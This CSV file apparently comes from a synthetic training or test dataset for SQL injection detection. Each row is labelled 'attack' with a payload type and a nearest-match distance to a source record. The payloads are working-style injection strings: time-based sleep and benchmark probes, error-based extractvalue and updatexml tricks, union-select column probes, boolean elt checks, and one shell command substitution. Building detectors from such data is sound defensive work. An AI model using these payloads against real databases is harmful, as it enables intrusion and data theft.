id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000530,attack,boolean,"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'bxnn'  =  'bxnn",nearest_attack_euclidean,R007766,3.7379901087645004
CTGAN_000531,attack,boolean,"-3436  )   or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R008702,2.4506330384964046
CTGAN_000532,attack,other,select   (  case when   (  1082  =  6755  )   then 1082 else 1082*  (  select 1082 from mysql.db  )   end  )  #,nearest_attack_euclidean,R008660,4.077050978032954
CTGAN_000533,attack,boolean,"1 and elt  (  8853  =  1675,1675  )  -- jegm",nearest_attack_euclidean,R004931,2.525483060298544
CTGAN_000534,attack,error,"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""pnub""  =  ""pnub",nearest_attack_euclidean,R003856,4.039707317002648
CTGAN_000535,attack,boolean,"1' where 9003  =  9003 and make_set  (  5868  =  8316,8316  )  --",nearest_attack_euclidean,R002632,3.136108042346039
CTGAN_000536,attack,other,"1""  )   as vqkz where 8536  =  8536",nearest_attack_euclidean,R004832,8.226295193597242
CTGAN_000537,attack,boolean,"1%'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R008055,2.8280826381756485
CTGAN_000538,attack,boolean,"1""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and ""cbck"" like ""cbck",nearest_attack_euclidean,R008184,3.434137612216506
CTGAN_000539,attack,other,1' where 7036  =  7036,nearest_attack_euclidean,R001285,3.8872064418648256
CTGAN_000540,attack,boolean,"1%""  )   and 9764  =  6037 and   (  ""%""  =  """,nearest_attack_euclidean,R007481,2.041313716358877
CTGAN_000541,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R002638,2.73661664006533
CTGAN_000542,attack,boolean,"1""  )   and make_set  (  4553  =  8132,8132  )   and   (  ""pfci"" like ""pfci",nearest_attack_euclidean,R008399,2.7471456111672863
CTGAN_000543,attack,time,1'   )    )     )   and sleep  (  5  )  #,nearest_attack_euclidean,R001973,3.7136585641935245
CTGAN_000544,attack,error,"1'||  (  select 'mwmn' where 5112  =  5112 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",nearest_attack_euclidean,R001472,2.447932815295876
CTGAN_000545,attack,other,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3# kuqm",nearest_attack_euclidean,R008250,3.7346792055135953
CTGAN_000546,attack,boolean,"1'+  (  select qmez where 3729  =  3729 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R002549,2.996661384867669
CTGAN_000547,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R006753,8.969750981065223
CTGAN_000548,attack,boolean,"1'+  (  select lgkd where 7801  =  7801 and elt  (  4249  =  4249,7259   )    )   +'",nearest_attack_euclidean,R006801,2.0233062364344248
CTGAN_000549,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'lywy' like 'lywy",nearest_attack_euclidean,R008427,5.75132754513282
CTGAN_000550,attack,time,"1""   )    )    as uqkn where 4642  =  4642 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R008380,3.379985840656977
CTGAN_000551,attack,error,"1""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""auyv""  =  ""auyv",nearest_attack_euclidean,R003259,4.069610771533352
CTGAN_000552,attack,other,"1',  (  select   (  case when   (  5249  =  9648  )   then 1 else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R005472,3.7650010589692657
CTGAN_000553,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R003039,2.6416067058854917
CTGAN_000554,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R004443,4.896050536544612
CTGAN_000555,attack,other,"1""   )    )    as chal where 6661  =  6661",nearest_attack_euclidean,R002111,3.624431963324041
CTGAN_000556,attack,other,-4947' order by 1#,nearest_attack_euclidean,R004062,5.997816705730428
CTGAN_000557,attack,time,"1'  )   as vlwh where 9403  =  9403 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R004364,6.6563181764900365
CTGAN_000558,attack,time,"1"" where 1683  =  1683 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R005177,4.0644392578162325
CTGAN_000559,attack,union,"-2333' union all select 9714,9714,9714--",nearest_attack_euclidean,R003807,5.828628258928966
CTGAN_000560,attack,other,select   (  case when   (  9746  =  8055  )   then 9746 else 1/  (  select 0  )   end  )  --,nearest_attack_euclidean,R004600,2.7776536391836895
CTGAN_000561,attack,union,"1'  )   where 8628  =  8628 union all select null,null,null--",nearest_attack_euclidean,R007511,2.663012496171238
CTGAN_000562,attack,union,"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",nearest_attack_euclidean,R007992,11.034311061943036
CTGAN_000563,attack,other,"  (  select 1 from generate_series  (  8515,8515,case when   (  8515  =  3477  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R004787,4.511438322894277
CTGAN_000564,attack,other,select case when 7426  =  6635 then 1 else null end--,nearest_attack_euclidean,R000917,3.446311580270227
CTGAN_000565,attack,other,1   )    )    as mlpf where 7425  =  7425,nearest_attack_euclidean,R001024,3.819858884641656
CTGAN_000566,attack,boolean,1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- slje,nearest_attack_euclidean,R005627,3.2467245845319317
CTGAN_000567,attack,time,1'+  (  select 'diet' where 7004  =  7004 rlike sleep  (  5   )    )   +',nearest_attack_euclidean,R005804,3.4114161326841415
CTGAN_000568,attack,union,"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",nearest_attack_euclidean,R001609,2.1649665199330594
CTGAN_000569,attack,union,"1  )   where 8630  =  8630 union all select null,null--",nearest_attack_euclidean,R002805,3.871108980237236
CTGAN_000570,attack,union,"-4093'   )    )    union all select 5785,5785,5785#",nearest_attack_euclidean,R007115,3.820948142927871
CTGAN_000571,attack,error,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""ftjg""  =  ""ftjg",nearest_attack_euclidean,R001282,4.460766857487184
CTGAN_000572,attack,boolean,"1'||  (  select 'fmss' from dual where 7025  =  7025 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R006600,4.312020597405852
CTGAN_000573,attack,error,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kudh' like 'kudh",nearest_attack_euclidean,R006790,5.1792094733592196
CTGAN_000574,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R003005,3.208874218765288
CTGAN_000575,attack,union,"-5903%'  )   union all select 8293,8293,8293,8293,8293,8293,8293,8293#",nearest_attack_euclidean,R006910,3.915044929521776
CTGAN_000576,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R006753,14.961070302453761
CTGAN_000577,attack,error,"  (  select 2768 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  2768  =  2768,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R003669,2.8334503786454763
CTGAN_000578,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,4.043027126330951
CTGAN_000579,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R001194,4.362683076032671
CTGAN_000580,attack,union,"-8258""   )    )    as swjp where 2681  =  2681 union all select 2681,2681,2681,2681,2681,2681--",nearest_attack_euclidean,R008296,5.486145618301567
CTGAN_000581,attack,error,"1%' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and '%'  =  '",nearest_attack_euclidean,R006797,4.736101801052771
CTGAN_000582,attack,other,"1',  (  case when 2872  =  2872 then 1 else null end  )  ",nearest_attack_euclidean,R008965,3.865421745316191
CTGAN_000583,attack,time, (  7098  =  7098 and sleep  (  5   )    ) ,nearest_attack_euclidean,R005847,6.041882339550054
CTGAN_000584,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000070,4.354551122514449
CTGAN_000585,attack,union,"-9175'   )    )    union all select 6174,6174,6174,6174--",nearest_attack_euclidean,R008923,3.3923093753154165
CTGAN_000586,attack,union,"1'||  (  select 'vixv' from dual where 7704  =  7704 union all select null,null,null,null,null--",nearest_attack_euclidean,R003188,7.674309914083166
CTGAN_000587,attack,error,"-6523"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""bwrb"" like ""bwrb",nearest_attack_euclidean,R001510,4.053896946919301
CTGAN_000588,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R002848,3.67225743690705
CTGAN_000589,attack,error,"1' in boolean mode  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R005056,4.4857433847779
CTGAN_000590,attack,union,"-5924' where 5415  =  5415 union all select 5415,5415,5415,5415,5415,5415#",nearest_attack_euclidean,R004709,2.965386731552273
CTGAN_000591,attack,other,1'||  (  select 'yezk' where 2097  =  2097,nearest_attack_euclidean,R006958,2.8442538072416537
CTGAN_000592,attack,union," select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000008,9.356912352348008
CTGAN_000593,attack,other,1'   )    )    as vdhw where 8858  =  8858 order by 1#,nearest_attack_euclidean,R002323,3.782069088658576
CTGAN_000594,attack,boolean,"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'hqqj'  =  'hqqj",nearest_attack_euclidean,R006485,3.671889727632722
CTGAN_000595,attack,other,"  (  select 1 from generate_series  (  9352,9352,case when   (  9352  =  9352  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R002435,3.382127941428304
CTGAN_000596,attack,time,"1'+  (  select 'wkcq' where 1020  =  1020 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R006351,5.163108006269621
CTGAN_000597,attack,time,1' in boolean mode  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R003584,4.5197383156451565
CTGAN_000598,attack,error,"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  6986  =  6986",nearest_attack_euclidean,R007062,2.72929761129976
CTGAN_000599,attack,boolean,"-9996' or make_set  (  1237  =  7111,7111  )  ",nearest_attack_euclidean,R002606,3.8396266442483347
CTGAN_000600,attack,boolean,"1'   )    )    and elt  (  6847  =  5874,5874  )   and    (    (   'yspu'  =  'yspu",nearest_attack_euclidean,R002897,3.0899068582088676
CTGAN_000601,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  ",nearest_attack_euclidean,R007425,3.815834527016133
CTGAN_000602,attack,union,"1   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R002412,5.441355743042319
CTGAN_000603,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003027,3.941845052167535
CTGAN_000604,attack,other,1'||  (  select 'cfff' where 4994  =  4994,nearest_attack_euclidean,R001799,2.0247843752506616
CTGAN_000605,attack,time,1%'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R008178,4.067927546110181
CTGAN_000606,attack,time,"1"" where 3990  =  3990 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R004054,3.8663777539221145
CTGAN_000607,attack,error,"1%""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R008004,4.6730597669471345
CTGAN_000608,attack,boolean,"1 and make_set  (  8403  =  8403,8899  )  ",nearest_attack_euclidean,R002879,1.9589305636084802
CTGAN_000609,attack,union,"1%'   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000665,3.2090614572439637
CTGAN_000610,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R007727,7.2836549478249575
CTGAN_000611,attack,other,"select count  (  *  )   from generate_series  (  1,5000000   )    )   ||'",nearest_attack_euclidean,R003441,3.9876276005323077
CTGAN_000612,attack,time,1' in boolean mode  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R007929,3.447210799790384
CTGAN_000613,attack,other,select   (  case when   (  9376  =  4521  )   then 1 else 9376*  (  select 9376 from master..sysdatabases  )   end  )  --,nearest_attack_euclidean,R006737,3.1882997049985167
CTGAN_000614,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R001062,4.01546704155971
CTGAN_000615,attack,time,1'||  (  select 'jmhb' where 1794  =  1794 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R003533,4.600434578400936
CTGAN_000616,attack,union,"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000989,2.811793671196139
CTGAN_000617,attack,boolean,-6030%'  )   or 3038  =  3038,nearest_attack_euclidean,R001832,2.1863042820396
CTGAN_000618,attack,other,1  )   where 7026  =  7026,nearest_attack_euclidean,R001112,3.177080318726991
CTGAN_000619,attack,union,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",nearest_attack_euclidean,R001208,6.068388284873353
CTGAN_000620,attack,time,1   )    )    as uadn where 9588  =  9588 rlike sleep  (  5  )  #,nearest_attack_euclidean,R004073,2.8349187183744027
